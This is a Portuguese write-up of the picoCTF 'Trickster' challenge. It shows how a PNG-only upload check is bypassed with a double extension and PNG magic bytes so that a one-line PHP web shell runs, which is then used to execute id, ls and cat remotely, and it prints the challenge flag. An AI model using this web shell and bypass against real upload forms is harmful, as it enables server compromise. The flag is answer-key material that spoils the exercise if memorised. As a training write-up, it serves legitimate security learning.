# Trickster  
###### Resolvido por @Menegaldo
> Este é um CTF sobre [Upload Arbitrário de Arquivos, Execução Remota de Código (RCE) e Exposição de Diretórios e Arquivos Sensíveis

## Sobre o Desafio

Encontrei um aplicativo da web que pode ajudar a processar imagens: apenas imagens PNG!<br>
Detalhes adicionais estarão disponíveis após o lançamento de sua instância de desafio.

- [Trickster](https://play.picoctf.org/practice/challenge/445) 

## Solução  

Abrimos a URL do desafio e identificamos uma funcionalidade de upload que aceita apenas arquivos .png.

![image](https://github.com/user-attachments/assets/1ad8aadb-93a2-428b-b7a2-7ae33bc847cc)

Criamos um arquivo yo.php com uma simples payload PHP ```(<?=\$_GET[0]`?>`)```.

Tentamos enviá-lo, mas o servidor rejeitou, indicando que o nome do arquivo precisava conter .png.

![image](https://github.com/user-attachments/assets/5a513762-7cf8-4af4-8382-ff46da02f5dc)

Renomeamos o arquivo para yo.png.php e tentamos o upload novamente.
O servidor aceitou o nome, mas ainda rejeitou o arquivo dizendo que não era um PNG válido.

![image](https://github.com/user-attachments/assets/3b878932-f653-47d5-bef0-978a6afaa22f)

![image](https://github.com/user-attachments/assets/58157f2b-faf5-4fa4-8736-2362f4d855fd)

Pegamos os bytes mágicos do PNG (89 50 4E 47 0D 0A 1A 0A).
Criamos um arquivo base.png, abrimos em um editor hexadecimal e inserimos os bytes mágicos no início.

![image](https://github.com/user-attachments/assets/192391de-0113-44a6-ab5e-cec08305a643)

No final do arquivo, adicionamos a payload PHP ```(<?=\$_GET[0]`?>`)```.
Renomeamos para yo.png.php e fizemos o upload novamente.

![image](https://github.com/user-attachments/assets/5fc90973-f63b-44b4-93d2-7496179895dc)

![image](https://github.com/user-attachments/assets/c443c4ff-015d-44cc-b707-d0aad97d8398)

![image](https://github.com/user-attachments/assets/f448d0dc-aa4d-44c9-a156-20f23310f1b9)

Testamos diretórios comuns (/uploads/, /files/, /images/) e encontramos nosso arquivo em:

```https
http://atlas.picoctf.net:62573/uploads/yo.png.php
```

Testamos a execução de código com ?0=id, confirmando o acesso

```
http://atlas.picoctf.net:62573/uploads/yo.png.php?0=id
```

Listamos arquivos no diretório

```
http://atlas.picoctf.net:62573/uploads/yo.png.php?0=ls ..
```

Encontramos GQ4DOOBVMMYGK.txt e lemos o conteúdo

```
http://atlas.picoctf.net:62573/uploads/yo.png.php?0=cat%20../GQ4DOOBVMMYGK.txt
```

![image](https://github.com/user-attachments/assets/77bd82c3-e2cd-4150-a259-d26c06d14ac9)

> Assim, obtemos a flag `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}` 
